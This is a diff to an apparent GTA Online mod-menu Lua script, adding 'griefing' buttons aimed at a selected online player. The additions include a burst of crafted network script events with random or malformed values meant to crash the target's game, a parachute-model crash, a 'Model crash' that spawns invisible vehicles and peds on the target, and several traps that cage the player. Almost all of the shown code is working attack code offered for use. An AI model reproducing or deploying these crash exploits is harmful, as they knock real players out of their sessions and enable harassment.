@@ -7814,7 +7814,7 @@ script.register_looped("ramLoopz", function()
 end)
 toolTip(griefPlayerTab, "Sandwiches the selected player between 2 vehicles at high velocity")
 
--- griefPlayerTabing Explode Player 2
+-- griefPlayerTab Explode Player 2
 griefPlayerTab:add_sameline()
  explodeLoop = false
 explodeLoop = griefPlayerTab:add_checkbox("Explosion")
@@ -7878,30 +7878,81 @@ script.register_looped("prCrash", function()
 end)
 toolTip(griefPlayerTab, "Spawns Princes Robot figurines worth $1,000,000, causing the player to crash (not very effective on modders)")
 -- SCH-Lua
+
+griefPlayerTab:add_sameline()
+griefPlayerTab:add_button("TSE C", function()
+
+    if pid == PLAYER.PLAYER_ID() then
+        gui.show_message("prompt","不可对自己使用")
+        return
+     end
+     local int_min = -2147483647
+     local int_max = 2147483647
+     network.trigger_script_event(1 << pid, {879177392, pid, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
+     network.trigger_script_event(1 << pid, {879177392, pid, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
+     network.trigger_script_event(1 << pid, {879177392, pid, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
+     network.trigger_script_event(1 << pid, {879177392, pid, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
+     network.trigger_script_event(1 << pid, {548471420, pid, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
+     network.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
+     math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+     math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+     network.trigger_script_event(1 << pid, { -555356783, pid ,85952,99999,52682274855,526822745 })
+     network.trigger_script_event(1 << pid, { 526822748, pid ,78552,99999 ,7949161,789454312})
+     network.trigger_script_event(1 << pid, { -66669983, pid ,526822748,555555, math.random(80521,2959749521) })
+     network.trigger_script_event(1 << pid, { -1733737974, pid ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
+     network.trigger_script_event(1 << pid, { -1529596656, pid ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
+     network.trigger_script_event(1 << pid, { -8965204809, pid ,795221,59486,48512151,-9545440 })
+     gui.show_message("正在发送脚本事件崩溃",pid)
+     network.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
+     network.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
+     network.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+ 
+ 
+     for i = 1, 50 do
+        --network.trigger_script_event(1 << pid,{-642704387, pid, 782258655, math.random(int_min, int_max), math.random(int_min, int_max),math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max) })
+     end
+
+
+    for i = 1, 15 do
+        network.trigger_script_event(1 << pid, {891653640, 0, 81468, 96773, 84776, 2939, 20158,  14219,  38254,  22206})
+        network.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
+        network.trigger_script_event(1 << pid,{-642704387, pid, 782258655, math.random(int_min, int_max), math.random(int_min, int_max),math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max) })
+
+        network.trigger_script_event(1 << pid, {-992162568, 0, 40778, 85683, 32561, 49696, 24000,  78834,  1860,  37655, math.random(int_min, int_max), math.random(int_min, int_max), -- Crash Event S1
+        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+        network.trigger_script_event(1 << pid, {891653640, 0, 81468, 96773, 84776, 2939, 20158,  14219,  38254,  22206})
+    end
+    network.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
+    network.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
+    network.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+
+end)
+
 griefPlayerTab:add_sameline()
 griefPlayerTab:add_button("Fragment crash", function()
     script.run_in_fiber(function (fragcrash)
-        if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then
+        if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
             gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
             return
         end
         fraghash = joaat("prop_fragtest_cnst_04")
         STREAMING.REQUEST_MODEL(fraghash)
-         TargetCrds = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
-         crashstaff1 = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+        local TargetCrds = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+        local crashstaff1 = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(crashstaff1, 1, false)
-         crashstaff2 = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+        local crashstaff2 = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(crashstaff2, 1, false)
-         crashstaff3 = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+        local crashstaff3 = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(crashstaff3, 1, false)
-         crashstaff4 = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+        local crashstaff4 = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(crashstaff4, 1, false)
         for i = 0, 100 do 
-            if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then
+            if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
                 gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
                 return
             end    
-             TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
             ENTITY.SET_ENTITY_COORDS_NO_OFFSET(crashstaff1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
             ENTITY.SET_ENTITY_COORDS_NO_OFFSET(crashstaff2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
             ENTITY.SET_ENTITY_COORDS_NO_OFFSET(crashstaff3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
@@ -7914,42 +7965,42 @@ griefPlayerTab:add_button("Fragment crash", function()
         end
     end)
     script.run_in_fiber(function (fragcrash2)
-         TargetCrds = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+        local TargetCrds = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
         fraghash = joaat("prop_fragtest_cnst_04")
         STREAMING.REQUEST_MODEL(fraghash)
         for i=1,10 do
-            if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then
+            if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
                 gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
                 return
             end    
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             delete_entity(object)
-             object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
+            local object = OBJECT.CREATE_OBJECT(fraghash, TargetCrds.x, TargetCrds.y, TargetCrds.z, true, false, false)
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
             fragcrash2:sleep(100)
             delete_entity(object)
@@ -7957,6 +8008,145 @@ griefPlayerTab:add_button("Fragment crash", function()
     end)
 end)
 toolTip(griefPlayerTab, "Spawns a bunch of objects on the selected player and breaks them into fragments, causing them to crash")
+
+griefPlayerTab:add_button("Parachute Crash 2", function()
+    script.run_in_fiber(function (t2crash)
+        if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
+            gui.show_message("The attack has stopped", "The target has been detected to have left or the target is himself")
+            return
+        end
+        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
+        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
+        t2crash:sleep(20)
+        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(network.get_selected_player()), true)
+        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
+        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 0xFBAB5776, 1000, false)
+        TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1087,-3012,13.94)
+        t2crash:sleep(500)
+        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
+        t2crash:sleep(1000)
+        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
+        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
+    end)
+end)
+
+griefPlayerTab:add_sameline()
+griefPlayerTab:add_button("Model crash", function()
+    script.run_in_fiber(function (vtcrash)
+        if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
+            gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
+            return
+        end
+        local ship = {-1043459709, -276744698, 1861786828, -2100640717,}
+        local pos117 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+        OBJECT.CREATE_OBJECT(0x9CF21E0F, pos117.x, pos117.y, pos117.z, true, true, false)
+        for crash, value in pairs (ship) do 
+            local c = {} 
+            for i = 1, 10, 1 do 
+                if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
+                    gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
+                    return
+                end        
+                local pos2010 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+                local selfpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
+                if calcDistance(selfpos, pos2010) <= 300 then 
+                    gui.show_message("The attack has stopped","Please stay away from the target first")
+                    return
+                end
+                c[crash] = CreateVehicle(value, pos2010, 0)
+                if c[crash] then
+                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(c[crash], true, false) 
+                    ENTITY.FREEZE_ENTITY_POSITION(c[crash])
+                    ENTITY.SET_ENTITY_VISIBLE(c[crash], false, false)    
+                end
+            end 
+        end
+    end)
+
+    script.run_in_fiber(function (vtcrash3)
+        if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
+            gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
+            return
+        end
+        local mdl = joaat("mp_m_freemode_01")
+        local veh_mdl = joaat("taxi")
+        request_model(veh_mdl)
+        request_model(mdl)
+            for i = 1, 10 do
+                local pos114 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(network.get_selected_player())
+                if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
+                    gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
+                    return
+                end        
+                local selfpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
+                if calcDistance(selfpos, pos114) <= 300 then 
+                    gui.show_message("The attack has stopped","Please stay away from the target first")
+                    return
+                end
+                local veh = CreateVehicle(veh_mdl, pos114, 0)
+                local jesus = CreatePed(2, mdl, pos114, 0)
+                if veh and jesus then 
+                    ENTITY.SET_ENTITY_VISIBLE(veh, false, false)
+                    ENTITY.SET_ENTITY_VISIBLE(jesus, false, false)
+                    PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
+                    PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 46, true)
+                    PED.SET_PED_COMBAT_RANGE(jesus, 4)
+                    PED.SET_PED_COMBAT_ABILITY(jesus, 3)
+                    vtcrash3:sleep(100)
+                    TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
+                    vtcrash3:sleep(1000)
+                    delete_entity(jesus)
+                    delete_entity(veh)    
+                end
+            end  
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
+    end)
+    script.run_in_fiber(function (vtcrash2)
+        for i = 1, 10, 1 do 
+            if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
+                gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
+                return
+            end    
+            local anim_dict = "anim@mp_player_intupperstinker"
+            STREAMING.REQUEST_ANIM_DICT(anim_dict)
+            while not STREAMING.HAS_ANIM_DICT_LOADED(anim_dict) do
+                vtcrash2:yield()
+            end
+        local pos115 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+        local selfpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
+        if calcDistance(selfpos, pos115) <= 300 then 
+            gui.show_message("The attack has stopped","Please stay away from the target first")
+            return
+        end
+        local ped = PED.CREATE_RANDOM_PED(pos115.x, pos115.y, pos115.z+10)
+        ENTITY.SET_ENTITY_VISIBLE(ped, false, false)
+        ENTITY.FREEZE_ENTITY_POSITION(ped, true)
+        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
+        PED.SET_PED_COMBAT_RANGE(ped, 4)
+        PED.SET_PED_COMBAT_ABILITY(ped, 3)
+        for i = 1, 10 do
+            if PLAYER.GET_PLAYER_PED(network.get_selected_player()) == PLAYER.PLAYER_PED_ID() then --避免目标离开战局后作用于自己
+                gui.show_message("The attack has stopped","The target has been detected to have left or the target is himself")
+                return
+            end    
+            local pos116 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+            local selfpos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
+            if calcDistance(selfpos, pos116) <= 300 then 
+                gui.show_message("The attack has stopped","Please stay away from the target first")
+                return
+            end
+            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos116.x, pos116.y, pos116.z+5, true, true, true)
+            TASK.TASK_SWEEP_AIM_POSITION(ped, anim_dict, "Y", "M", "T", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
+            vtcrash2:sleep(1000)
+            TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
+        end
+        delete_entity(ped)
+        vtcrash2:sleep(750)
+        end
+    end)
+end)
 
 griefPlayerTab:add_sameline()
 griefPlayerTab:add_button("Break HUD", function()
@@ -7966,6 +8156,106 @@ griefPlayerTab:add_button("Break HUD", function()
     gui.show_message("HUD Breaker", "This causes them to have no HUD and also cannot see interior entry points, they can't pause or switch weapons either.")
 end)
 toolTip(griefPlayerTab, "Removes and breaks the HUD of the selected player, this causes them to not be able to pause, enter apartments and ruins their freemode missions")
+
+griefPlayerTab:add_separator()
+griefPlayerTab:add_text("Cage Options")
+
+griefPlayerTab:add_button("small cage", function()
+    script.run_in_fiber(function (smallcage)
+        local objHash = joaat("prop_gold_cont_01")
+        STREAMING.REQUEST_MODEL(objHash)
+        while not STREAMING.HAS_MODEL_LOADED(objHash) do		
+            smallcage:yield()
+        end
+        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+        local obj = OBJECT.CREATE_OBJECT(objHash, pos.x, pos.y, pos.z-1, true, true, false)
+        ENTITY.FREEZE_ENTITY_POSITION(obj, true)
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
+    end)
+end)
+
+griefPlayerTab:add_sameline()
+
+griefPlayerTab:add_button("fence cage", function()
+    local objHash = joaat("prop_fnclink_03e")
+    STREAMING.REQUEST_MODEL(objHash)
+
+    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+
+    pos.z = pos.z - 1.0
+    local object = {}
+
+    object[1] = OBJECT.CREATE_OBJECT(objHash, pos.x - 1.5, pos.y + 1.5, pos.z,true, 1, 0)
+    object[2] = OBJECT.CREATE_OBJECT(objHash, pos.x - 1.5, pos.y - 1.5, pos.z,true, 1, 0)
+
+    object[3] = OBJECT.CREATE_OBJECT(objHash, pos.x + 1.5, pos.y + 1.5, pos.z,true, 1, 0)
+    local rot_3 = ENTITY.GET_ENTITY_ROTATION(object[3], 2)
+    rot_3.z = -90.0
+    ENTITY.SET_ENTITY_ROTATION(object[3], rot_3.x, rot_3.y, rot_3.z, 1, true)
+
+    object[4] = OBJECT.CREATE_OBJECT(objHash, pos.x - 1.5, pos.y + 1.5, pos.z,true, 1, 0)
+    local rot_4 = ENTITY.GET_ENTITY_ROTATION(object[4], 2)
+    rot_4.z = -90.0
+    ENTITY.SET_ENTITY_ROTATION(object[4], rot_4.x, rot_4.y, rot_4.z, 1, true)
+    ENTITY.IS_ENTITY_STATIC(object[1]) 
+    ENTITY.IS_ENTITY_STATIC(object[2])
+    ENTITY.IS_ENTITY_STATIC(object[3])
+    ENTITY.IS_ENTITY_STATIC(object[4])
+    ENTITY.SET_ENTITY_CAN_BE_DAMAGED(object[1], false) 
+    ENTITY.SET_ENTITY_CAN_BE_DAMAGED(object[2], false) 
+    ENTITY.SET_ENTITY_CAN_BE_DAMAGED(object[3], false) 
+    ENTITY.SET_ENTITY_CAN_BE_DAMAGED(object[4], false) 
+
+    for i = 1, 4 do ENTITY.FREEZE_ENTITY_POSITION(object[i], true) end
+    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
+end)
+
+griefPlayerTab:add_sameline()
+
+griefPlayerTab:add_button("competitive tube cage", function()
+    script.run_in_fiber(function (dubcage)
+        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+        STREAMING.REQUEST_MODEL(2081936690)
+        while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
+            dubcage:sleep(100)
+        end
+        local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z-5, true, true, false)
+        local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
+        rot.y = 90
+        ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
+        local cage_object2 = OBJECT.CREATE_OBJECT(2081936690, pos.x-5, pos.y+5, pos.z-5, true, true, false)
+        local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object2)
+        rot.x = 90 
+        ENTITY.SET_ENTITY_ROTATION(cage_object2, rot.x,rot.y,rot.z,2,true)
+    end)
+end)
+
+griefPlayerTab:add_sameline()
+
+griefPlayerTab:add_button("safe cage", function()
+    script.run_in_fiber(function (safecage)
+        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(network.get_selected_player()), false)
+        local hash = 1089807209
+        STREAMING.REQUEST_MODEL(hash)
+        while not STREAMING.HAS_MODEL_LOADED(hash) do		
+            STREAMING.REQUEST_MODEL(hash)
+            safecage:yield()
+        end
+        local objectsfcage = {}
+        objectsfcage[1] = OBJECT.CREATE_OBJECT(hash, pos.x - 0.9, pos.y, pos.z - 1, true, true, false) 
+        objectsfcage[2] = OBJECT.CREATE_OBJECT(hash, pos.x + 0.9, pos.y, pos.z - 1, true, true, false) 
+        objectsfcage[3] = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 0.9, pos.z - 1, true, true, false) 
+        objectsfcage[4] = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 0.9, pos.z - 1, true, true, false) 
+        objectsfcage[5] = OBJECT.CREATE_OBJECT(hash, pos.x - 0.9, pos.y, pos.z + 0.4 , true, true, false) 
+        objectsfcage[6] = OBJECT.CREATE_OBJECT(hash, pos.x + 0.9, pos.y, pos.z + 0.4, true, true, false) 
+        objectsfcage[7] = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 0.9, pos.z + 0.4, true, true, false) 
+        objectsfcage[8] = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 0.9, pos.z + 0.4, true, true, false) 
+        for i = 1, 8 do ENTITY.FREEZE_ENTITY_POSITION(objectsfcage[i], true) end
+        safecage:sleep(100)
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
+    end)
+end)
+-- end sch-lua
 
 -- Grief Sound Spam Targetable
 griefPlayerTab:add_separator()
